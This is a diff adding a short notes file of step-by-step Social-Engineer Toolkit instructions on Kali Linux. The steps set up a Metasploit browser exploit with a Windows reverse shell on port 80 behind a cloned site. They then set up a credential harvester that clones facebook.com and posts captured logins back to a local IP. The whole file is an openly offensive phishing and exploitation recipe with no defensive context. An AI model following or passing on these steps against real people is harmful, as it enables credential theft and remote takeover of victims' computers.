@@ -1,0 +1,27 @@
+open kali
+sudo su
+setoolkit
+type 1 (social engineering attack)
+type 2 (website attack vectors)
+type 2 (metasploit browser exploit attack)
+type 2 (site cloner)
+
+open second terminal 
+sudo su
+service apache2 start
+
+In first terminal
+enter link:- http://localhost/
+type 1 (adobe flash bytearray...)
+type 1 (windows shell reverse)
+Port to use for the reverse [443]: 80
+
+open third terminal
+sudo su
+setoolkit
+type 1 (social engineering attack)
+type 2 (website attack vectors)
+type 3 (credential harvester)
+type 2 (site cloner)
+IP address for thr POST back in Harvester/Tabnabbing[10.0.2.15]:
+type enter the url to clone:https://facebook.com/>> enter >> 
